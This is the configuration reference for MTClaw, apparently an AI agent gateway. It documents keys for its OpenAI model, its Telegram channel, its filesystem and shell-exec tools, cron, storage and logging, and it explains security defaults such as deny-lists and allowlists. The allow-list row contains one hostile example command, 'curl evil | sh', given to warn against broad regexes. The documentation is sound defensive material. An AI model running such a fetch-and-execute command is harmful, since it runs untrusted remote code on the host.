# Configuration reference

MTClaw reads one YAML file, by default `~/.mtclaw/config.yaml` (override with
`--config <path>` or the `MTCLAW_CONFIG` environment variable). If
`config.yaml` does not exist but `config.yml` does, the `.yml` file is used
instead - useful if you generated the file with a tool that defaults to that
extension. If both exist, `config.yaml` wins and `mtclaw` prints one warning
to stderr naming the ignored `config.yml`, so an edit to the wrong file is
never silent. This alias applies **only** to the default (no-flag, no-env)
path: `--config <path>` and `MTCLAW_CONFIG` are always used exactly as given,
with no extension substitution - a typo there is an honest "file not found."
This document lists every key: its type, its default, what it controls, and
what breaks if it is wrong. A test (`internal/config/docs_coverage_test.go`)
asserts every field in the config struct appears verbatim on this page, so a
new key cannot ship undocumented; that test only checks presence of the
field name, not that the type/default/effect text in its row is still
accurate.

Precedence for everything except secrets: **config file value > built-in
default**, with one exception: the global `--log-level` flag overrides
`log.level`. A relative path in the file (`agent.workspace`,
`tools.filesystem.roots`, `tools.exec.cwd`, `*_file`, `storage.dsn`,
`log.file`, `agent.system_prompt_files`) resolves against the config file's
directory, not the current directory. A file with more than one YAML
document is rejected, and an empty file fails with "config file is empty". Secrets (the OpenAI key, the Telegram token) use a separate env/file
indirection layer described under `openai.api_key_env` and
`channels.telegram.token_env` below - **a literal `api_key:` or `token:` key
in the YAML is a validation error, not a warning**, so the config file stays
safe to paste into an issue or a gist.

Run `mtclaw config validate` to check a file against every rule below in one
pass, or `mtclaw doctor` to additionally check things validation cannot see
(files that exist on disk, network reachability, whether the model name is
real).

`mtclaw prompt` runs its turn against the shared `cli`/`local` session by
default; unlike `cron run`, it takes no lock, so two `mtclaw prompt`
invocations running at the same time can interleave that session's
transcript.

## `version`

| | |
|---|---|
| Type | integer |
| Default | `1` |
| Effect | Declares which schema this file was written against. |
| If wrong | Load fails outright: `unsupported schema version N; this build only understands version 1`. There is no migration path across major versions in v1 - there is only one version. |

## `agent`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `agent.name` | string | `MTClaw` | Interpolated into the first line of the system prompt ("You are `{name}`, a personal AI agent gateway...") every turn builds - not just a log/display label, even though it never appears in the gateway's own startup banner. | Nothing fails to load; changing it changes how the model refers to itself. |
| `agent.model` | string | *(none - must be set)* | The OpenAI chat model the agent loop calls for every turn. There is no hardcoded default: onboard writes it, or you must. | Empty fails validation. A typo'd name loads fine but every turn fails at the first OpenAI call with a model-not-found error; `mtclaw doctor`'s "Model exists" check catches this before that happens. |
| `agent.temperature` | float | *(unset)* | Sampling temperature passed straight to the OpenAI request. Left unset by default, which omits the field from the request entirely rather than sending a value: current OpenAI reasoning models (gpt-5, o3, o4-mini) reject any explicit temperature other than their own default of `1`. | Must be between `0` and `2` when set; out of range fails validation. |
| `agent.max_iterations` | integer | `20` | Hard cap on think/act/observe loop iterations within one turn (tool call -> result -> tool call -> ...). | Must be `1`-`100`. Too low cuts off legitimate multi-step tool use early, returning whatever partial answer exists; too high (near 100) risks a very expensive runaway turn if the model loops on a failing tool. |
| `agent.max_history_turns` | integer | `40` | Hard trim on how many past turns of a session's history are replayed to the model, applied after an internal, non-configurable 256 KiB byte budget on the same loaded history (dropping whole oldest turns first) - together, the only history bounds in v1 (no summarization). | Must be at least `2`. Too low loses context the model needs mid-conversation; there is no other memory mechanism to fall back on. |
| `agent.workspace` | path | `~/mtclaw-workspace` | The agent's own filesystem root. `tools.filesystem.roots` and `tools.exec.cwd` are separate keys with their own independent default of the same literal path (`~/mtclaw-workspace`), not derived from this one - setting `agent.workspace` alone does not move them; set all three to relocate the workspace. `mtclaw onboard` creates it; otherwise it is created the first time `write_file` targets a missing root (mode `0755`), rather than that call failing. | If it does not exist on disk, `mtclaw doctor`'s "Workspace exists and writable" check fails; a missing workspace does not stop the gateway from starting - `read_file`/`list_dir` fail at call time until something creates it, while `write_file` creates it as a side effect of its first call. |
| `agent.system_prompt_files` | list of paths | `[]` | Files concatenated, in order, as the system prompt. `onboard` writes one entry here pointing at the starter `AGENTS.md` it writes next to the config file being onboarded (`<directory of --config>/prompts/AGENTS.md` - not always `~/.mtclaw`). | A listed file that does not exist is skipped with a logged Warn, not a load or turn failure - the turn still runs, just with a thinner system prompt than configured. `mtclaw doctor`'s "system_prompt_files readable" check catches this ahead of time. |

## `openai`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `openai.api_key_env` | string | `OPENAI_API_KEY` | Name of the environment variable holding the API key. This is indirection, never the key itself. | If the named variable is unset (and `api_key_file` is also empty), the key resolves to empty; every OpenAI call fails immediately with an actionable "no API key resolved" error rather than a confusing 401. `mtclaw doctor`'s "OpenAI key resolves" check reports this before any real turn runs. |
| `openai.api_key_file` | path | *(empty)* | Fallback: a file whose contents are the key, with surrounding whitespace (spaces, tabs, newlines) trimmed, used only when the env var above is unset. | World-readable on POSIX logs a load-time warning (Windows: documented no-op, ACL-based permissions are not the mode bits this check reads). A missing file when named is a load error, and so is a file larger than 64 KiB (it is never silently truncated). |
| `openai.api_key` | string | *(must be empty)* | Exists only so a literal `api_key:` in the YAML is a recognized field - and therefore a clear validation error naming `api_key_env`/`api_key_file` - instead of an opaque "unknown field" decode failure. **Never set this.** | Any non-empty value here is a load error: `must not be set inline in the config file; use openai.api_key_env (or openai.api_key_file) instead`. |
| `openai.base_url` | string (URL) | `https://api.openai.com/v1` | The OpenAI-compatible endpoint every request goes to. | Must be an absolute `http(s)` URL or load fails. Pointing at the wrong host either fails outright or, worse, silently talks to something that is not OpenAI - only ever point this at an endpoint you trust with the key. |
| `openai.timeout` | duration (e.g. `120s`, `2m`) | `120s` | Per-request HTTP client timeout for OpenAI calls. | Must be greater than `0`. Too short aborts legitimately slow completions (large tool outputs, long generations) with a timeout error instead of an answer. |
| `openai.max_retries` | integer | `3` | Retries the OpenAI SDK performs internally on transient failures (5xx, rate limits) before giving up. | Must be `0` or greater. `0` means no retries (used deliberately by the exec auto-mode classifier, which builds its own client - see `tools.exec.auto`). |

## `channels.telegram`

The only channel in v1.

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `channels.telegram.enabled` | bool | `true` | Turns the Telegram long-polling channel on. `false` means `mtclaw gateway` refuses to start (no channel to serve) and every Telegram-specific doctor check is skipped, not failed. | N/A |
| `channels.telegram.token_env` | string | `TELEGRAM_BOT_TOKEN` | Name of the environment variable holding the bot token - indirection, never the token itself. | Unset (and no `token_file`) resolves to empty; the gateway and `mtclaw doctor`'s "Telegram token resolves" check report this with the fix. |
| `channels.telegram.token_file` | path | *(empty)* | Fallback file for the token, same semantics as `openai.api_key_file`, including trimming and the 64 KiB limit. | Same world-readable warning; missing file is a load error when named. |
| `channels.telegram.token` | string | *(must be empty)* | Exists only to turn a literal `token:` in the YAML into a named validation error, exactly like `openai.api_key`. **Never set this.** | Any non-empty value is a load error naming `token_env`/`token_file`. |
| `channels.telegram.allow_from` | list of int64 | `[]` | Numeric Telegram user IDs allowed to use the bot in a direct message. **Empty means deny everyone** - this is a fail-closed allowlist, not an opt-out. | If `enabled: true` and this (and every group's `allow_from`) is empty, the config **fails to load**: `would accept no one; set channels.telegram.allow_from`. `onboard` captures this interactively; if it cannot confirm an ID it writes `enabled: false` rather than an unloadable file, so you must add your ID and re-enable the channel before `mtclaw gateway` will start. Get your own ID with `/whoami` once the bot is running. |
| `channels.telegram.groups` | map, keyed by chat ID string | `{"*": {require_mention: true}}` | Per-group settings, keyed by the group's chat ID (e.g. `"-1001234567890"` for a supergroup). The key `"*"` is a default applied to any group not otherwise listed - but a `groups:` map you write yourself entirely replaces the built-in default map, `"*"` included: if you want a `"*"` fallback entry, list it yourself alongside your other groups. | A non-`"*"` key that does not parse as an integer, or that parses positive (a user ID, not a group ID - groups are negative), is a load error naming the offending key. |
| `channels.telegram.groups.*.require_mention` | bool | `true` | In a group chat, requires the bot be `@mentioned` (or replied to) before it responds - without this, every group message would be sent to the model. Defaults to `true` for **every** group entry that omits the key, listed or `"*"` - not just the built-in default group - so adding your own group entry to set its `allow_from` does not silently turn mention-gating off for it too. | Setting it `false` on a busy group means the bot reads and may respond to *every* message in that group, which is rarely what you want and burns API calls on irrelevant chatter. |
| `channels.telegram.groups.*.allow_from` | list of int64 | `[]` (inherits channel-level list) | Per-group allowlist override. Empty means "use `channels.telegram.allow_from`", not "deny everyone" - only the channel-level list's own emptiness is treated as deny-all. | A typo'd or stale entry here silently excludes someone who is on the channel-level list from that one group only; there is no doctor check for this specifically today. |
| `channels.telegram.api_base_url` | string (URL) | *(empty)* | Points the Telegram client at a Bot API server other than `https://api.telegram.org` - empty means the real thing. Supports a self-hosted [Bot API server](https://github.com/tdlib/telegram-bot-api), and is how MTClaw's own automated tests point the real client at a local fake with no network. **This is a token-trust boundary: whoever runs the named host receives your bot token on every request.** | Non-empty and not an absolute `http(s)` URL fails validation. Pointing it at an untrusted host hands that host your bot token; only ever set this to a server you run or explicitly trust. |

## `tools.filesystem`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `tools.filesystem.enabled` | bool | `true` | Registers `read_file`/`write_file`/`list_dir`. `false` removes them from the model's tool list entirely. | N/A |
| `tools.filesystem.roots` | list of paths | `[~/mtclaw-workspace]` | Every filesystem-tool path is confined to (symlink-resolved against) one of these roots. This is the sandbox boundary for file access. | Must be non-empty and each entry must be absolute after expansion, or load fails. A root that does not exist on disk loads fine but `mtclaw doctor`'s "filesystem.roots exist" check fails, and every filesystem-tool call into it fails at call time. |
| `tools.filesystem.max_read_bytes` | integer | `262144` | Caps how much of a file `read_file` returns in one call; the rest is truncated with an explicit marker. | Must be greater than `0` when the tool is enabled, or load fails. Too low silently truncates large files the model needed in full, though it is told truncation happened. |
| `tools.filesystem.max_write_bytes` | integer | `1048576` | Caps how much content `write_file` accepts in one call. | Must be greater than `0` when the tool is enabled, or load fails. Too low refuses legitimate large writes with a clear tool-result error (not a crash). |

## `tools.web_fetch`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `tools.web_fetch.enabled` | bool | `true` | Registers the `web_fetch` tool (GET only). | N/A |
| `tools.web_fetch.timeout` | duration | `30s` | Per-request timeout for a fetch. | Must be greater than `0` when the tool is enabled, or load fails - `0` used to mean "no timeout"; it is now rejected instead. Too short aborts fetches of legitimately slow pages. |
| `tools.web_fetch.max_bytes` | integer | `1048576` | Caps how much of a response body is read before truncating. | Must be greater than `0` when the tool is enabled, or load fails. Too low truncates large pages; the model is told this happened. |

`web_fetch` always refuses loopback, link-local, unspecified, private,
multicast, CGNAT, and cloud-metadata address space at connect time, including
on every redirect hop - see the web_fetch section of `docs/security.md` -
this is not configurable, by design.

## `tools.exec`

The highest-risk section. Read `docs/security.md` in full before changing
anything here.

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `tools.exec.enabled` | bool | `true` | Registers the `exec` tool at all. `false` removes shell access entirely. Setting `tools.exec.mode: off` is an accepted equivalent spelling: `mtclaw` normalizes it to `enabled: false` immediately after loading the file, so every check past that point (the tool registry, `mtclaw doctor`) only ever looks at this one field. | N/A |
| `tools.exec.mode` | string: `approval` \| `auto` \| `off` | `approval` | The policy pipeline's third stage (after deny-list, then allow-list), consulted only when `enabled` is (still) `true`. `approval` asks a human every unmatched command. `auto` (**beta**) asks an LLM classifier and only interrupts for commands it flags as risky. `off` is normalized to `enabled: false` at load time (see above), so it never reaches this stage at all. | Must be one of the three values or load fails. **`auto` is not a security control** - `mtclaw doctor` always warns when it is set, and `onboard` never offers it as a choice; it is a deliberate, documented config edit only. |
| `tools.exec.shell` | list of strings | `[]` (OS default: `[/bin/bash, -lc]` on POSIX, `[powershell, -NoProfile, -Command]` on Windows) | The shell argv every exec command runs under. Must be empty (OS default) or have at least two elements: the shell plus the flag that takes the command. | A single element fails validation. `shell[0]` not found on `PATH` loads fine but every command fails at run time; `mtclaw doctor`'s "Shell exists" check catches this ahead of time. |
| `tools.exec.cwd` | path | `~/mtclaw-workspace` | Starting working directory for every exec command. **Not a jail** - any command can `cd` elsewhere, and nothing in the product ever compares this value against `tools.filesystem.roots`, at load time or at exec call time; the deny-list is the only real enforcement boundary (see `docs/security.md`). | Not checked against `tools.filesystem.roots` at all - `config.Validate` cannot see the filesystem, and this is a usability convention, not a security boundary. A cwd that does not exist on disk passes validation but fails `mtclaw doctor`'s "exec.cwd exists" check and every real command at run time. |
| `tools.exec.timeout` | duration | `120s` | Per-command wall-clock timeout, layered on top of (not instead of) the turn's own context - cancelling the turn kills the command too. | Must be greater than `0` when the tool is enabled, or load fails. Too short kills legitimately long-running commands (builds, big downloads) partway through. |
| `tools.exec.max_output_bytes` | integer | `65536` | Caps captured combined stdout+stderr; the rest is truncated with an explicit marker. | Must be greater than `0` when the tool is enabled, or load fails. Too low hides output the model needed to see, though truncation is marked. |
| `tools.exec.approval_timeout` | duration | `5m` | How long an `approval`-mode (or auto-mode "ask") prompt waits for a human decision before expiring. | Must be greater than `0` when the tool is enabled, or load fails. Expiry is treated as a refusal (audited as `expired`, distinct from a human `denied_user`), never as an implicit approval. |
| `tools.exec.deny` | list of regexes | `[]` (onboard writes an OS-appropriate starter list) | **The only real enforcement boundary in this design.** Checked first, unconditionally; a match refuses the command permanently - not overridable by the allow-list, the classifier, or a human approval. | An invalid regex fails to load, naming the pattern. An **empty list with exec enabled is not a load error, but `mtclaw doctor` warns loudly** - see `docs/security.md` for what this list does and does not stop, including two known false positives (`docker rm -f`, `npm rm -f`). |
| `tools.exec.allow` | list of regexes | `[]` | Commands matching here run with no prompt, unless a `deny` pattern also matched (deny always wins). | An invalid regex fails to load, naming the pattern. A pattern that is too broad silently removes the approval step for more than intended - review these like you would a firewall rule. `.` matches `;`, `&` and `|`, so `^npm run .+$` also permits `npm run build; curl evil | sh` with no prompt (deny rules still apply); prefer a tight class such as `^npm run [\w:.-]+$`. |
| `tools.exec.auto` | object | *(see sub-keys)* | Groups the `auto`-mode classifier's own settings; only consulted when `tools.exec.mode: auto`. | N/A |
| `tools.exec.auto.model` | string | `""` (falls back to `agent.model`) | Which model the classifier calls. Kept separate from the agent's own client so the classifier's `max_retries` can be forced to `0` (a slow, retrying classifier defeats the point of a "cheap" check). | An invalid or unreachable model here fails closed to `VerdictAsk` (prompts the human), never to an unattended run. The classifier call has a fixed 10 s timeout (not configurable); a timeout also fails closed to asking. |
| `tools.exec.auto.confirm_on` | list of strings from `destructive`, `privileged`, `network`, `secret_access` | `[destructive, privileged, network, secret_access]` | Which classifier-reported risk categories force a human prompt even when overall risk is not `"high"`. Entries and the classifier's reported categories are matched case- and whitespace-insensitively. | Removing a category here means that category of command can run unattended under `auto` mode purely on the classifier's say-so - which is exactly the convenience-not-security-control trade documented in `docs/security.md`. |

## `cron`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `cron.enabled` | bool | `false` | Turns the in-process scheduler on inside `mtclaw gateway`. | N/A |
| `cron.timezone` | string (IANA name or `Local`) | `Local` | Timezone every job's cron expression and "next due" calculation is evaluated in. | Must load via the standard timezone database or load fails; `mtclaw doctor`'s "Cron" check re-confirms this and prints next-run times. |
| `cron.jobs` | list of job objects | `[]` | The scheduled prompts themselves; see sub-keys below. | N/A |
| `cron.jobs[].name` | string | *(required)* | Unique identifier for the job, used in `cron list`/`cron run <name>` and in run history. | Empty or duplicate names fail to load. |
| `cron.jobs[].schedule` | string, exactly 5 whitespace-separated fields (or an `@daily`/`@hourly`/... macro) | *(required)* | When the job fires, evaluated in `cron.timezone`. The scheduler wakes on each wall-clock minute boundary and evaluates at second 0, so the 5 fields are minute/hour/day/month/weekday - never seconds. If a wake is late (host suspend, clock step) it also evaluates the whole minutes it missed, up to 10 minutes back, and logs a warning naming how many were skipped; nothing is replayed after a restart. A spring-forward gap still skips jobs scheduled inside the missing hour; a fall-back repeat fires once. | Empty, an expression `gronx` cannot parse, or one with 6 fields (seconds-first) or 7 (year-suffixed) - both of which `gronx` itself can parse but this scheduler can never fire correctly - fails to load, naming the job. |
| `cron.jobs[].prompt` | string | *(required)* | The text sent to the agent loop as if a user had typed it, on each fire. | Empty fails to load. |
| `cron.jobs[].enabled` | bool | `false` | Per-job on/off switch independent of `cron.enabled`. A disabled job's `deliver_to` is not checked for reachability at load time (see `cron.jobs[].deliver_to.chat_id` below), but `mtclaw cron run <name> --deliver` still validates it with the same rules as load, regardless of `cron.enabled` and this flag, before any model call: an empty `chat_id`, the `"*"` key, or an unreachable chat is refused. A manual run of a disabled job is otherwise allowed. | A disabled job is skipped by the scheduler; `cron list` prints its `ENABLED` column as `false` with `-` for next due, while `mtclaw doctor`'s Cron check prints it as "disabled". |
| `cron.jobs[].session` | string: `persistent` \| `ephemeral` | *(required)* | `persistent` reuses the same session (and its history) across every fire; `ephemeral` gets a fresh, throwaway session each time. | Must be one of the two values or load fails. |
| `cron.jobs[].timeout` | duration | *(required, must be > 0)* | Per-fire turn timeout, independent of `tools.exec.timeout`; it also bounds a manual `mtclaw cron run`. | `0` or negative fails to load. |
| `cron.jobs[].deliver_to` | object | *(required)* | Where the fire's result is sent; see sub-keys below. | N/A |
| `cron.jobs[].deliver_to.channel` | string | *(required, only `"telegram"` supported)* | Which channel delivers the result. | Empty, or anything other than `"telegram"`, fails to load. |
| `cron.jobs[].deliver_to.chat_id` | string | *(required)* | The chat ID the result is sent to - must already be reachable: a numeric ID in `channels.telegram.allow_from`, or a key in `channels.telegram.groups`. This reachability check only runs for a job that can actually fire (`cron.enabled: true` and the job's own `enabled: true`); an unreachable `chat_id` on a currently-disabled job or with cron turned off entirely does not block the rest of the config from loading. | A chat ID that is not reachable that way, on a job that can fire, fails to load, naming the job - this exists specifically so a config typo becomes a load-time error, not a job that silently fails to deliver on every single fire. |

## `storage`

`storage.driver` selects the persistence backend; `storage.dsn` is the
canonical connection string. `storage.path` is `storage.dsn`'s
**deprecated** predecessor, kept as a working alias with no removal
planned: every config written before `storage.dsn` existed keeps loading
with no user action. Set only one of `storage.dsn` / `storage.path` -
setting both is a load error naming both keys, since silently preferring
one could let you edit the wrong key and think you moved your database.
Only `storage.driver: sqlite` is registered by this binary today, and only
for that driver is a DSN a filesystem path subject to `~`/relative
expansion and the parent-directory-creatable check below - a future
second driver's DSN would be a connection string with different rules.

**Downgrade note.** Once `mtclaw onboard` has been run with a binary new
enough to write `storage.driver`/`storage.dsn` (or you add either key by
hand), reverting to an older binary is not a plain rollback: that older
binary's config loader rejects any unrecognized key outright, so it refuses
to start against a config containing `driver:`/`dsn:` at all - not merely
ignore them. Your database file itself is unaffected and safe either way
(SQLite's own on-disk format did not change). To actually downgrade, edit
the config first: delete the `driver:` line and rename `dsn:` back to
`path:` with the same value, then run the older binary.

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `storage.driver` | string | `sqlite` | Selects the backend `store.Open` dispatches to. Only `sqlite` is registered by this binary. | Any other value fails to load, naming the supported set. |
| `storage.dsn` | path (for the `sqlite` driver) | `~/.mtclaw/mtclaw.db` | The SQLite database file: sessions, messages, approvals, exec audit, cron run history. `#`, `?` and `%` are literal path characters (the file is created at exactly that path, mode `0600`). The gateway's instance lock also lives here, at the resolved DSN + `".lock"` - one lock per database, not one per machine or OS user, so two independent installs (two `--config` files, two databases) can each run their own gateway. `mtclaw cron run` and `mtclaw doctor`'s "Instance lock" check both derive the same path from this same resolved value. | The parent directory must be creatable or load fails. Setting both `storage.dsn` and `storage.path` fails to load, naming both keys. A file written by a *newer* binary (higher schema version) is refused outright rather than risk corrupting data this binary does not understand - `mtclaw doctor`'s "DB opens and migrates" check surfaces this. `mtclaw doctor`'s "Storage dir writable" check probes the database's parent directory and, when set, `log.file`'s directory; it creates nothing, and a directory that does not exist yet is judged by its nearest existing ancestor. |
| `storage.path` | path | *(unset)* | **Deprecated alias for `storage.dsn`.** Still fully supported: a config that sets only `storage.path` loads normally, with one deprecation warning on stderr, and uses that path exactly as before. `mtclaw config show` always renders the resolved value under `dsn`, never `path`, once loaded. | Setting both `storage.dsn` and `storage.path` fails to load, naming both keys. Otherwise behaves exactly like `storage.dsn` above. |

### Retention

Nothing prunes `messages`, `exec_audit`, `cron_runs`, or `approvals`; the
database only grows. The only deletes are `/new` (clears one chat's
history), `mtclaw sessions rm <id>`, and the cleanup of ephemeral cron
sessions. Tool results are stored as message rows (by default up to 1 MiB
for `web_fetch`, 256 KiB for `read_file`, 64 KiB for `exec`), so a persistent
cron job that fetches pages grows one session without bound, and `sessions
show` loads a whole session into memory. To reclaim disk after deleting,
stop the gateway and run `VACUUM` on the database (for example with the
`sqlite3` CLI). No automatic retention is provided. `sessions rm` against a
`storage.dsn` that points at a missing file reports "no database yet" and
creates nothing.

## `log`

| Key | Type | Default | Effect | If wrong |
|---|---|---|---|---|
| `log.level` | string: `debug` \| `info` \| `warn` \| `warning` \| `error` | `info` | Minimum severity logged. Matched case-insensitively, with surrounding whitespace trimmed; `warning` is an accepted alias of `warn`. | Anything else fails to load, naming the value. The `--log-level` flag is validated the same way. |
| `log.format` | string: `text` \| `json` | `text` | Log line encoding - `json` is meant for shipping logs somewhere structured. Matched case-insensitively, with surrounding whitespace trimmed. | Anything else fails to load, naming the value. |
| `log.file` | path | `""` (stderr) | When set, logs append to this file (parent directories created) instead of stderr. | Validation rejects a path that is an existing directory or whose parent directory cannot be created. A path that passes but is not writable still fails at logger construction, at startup. |
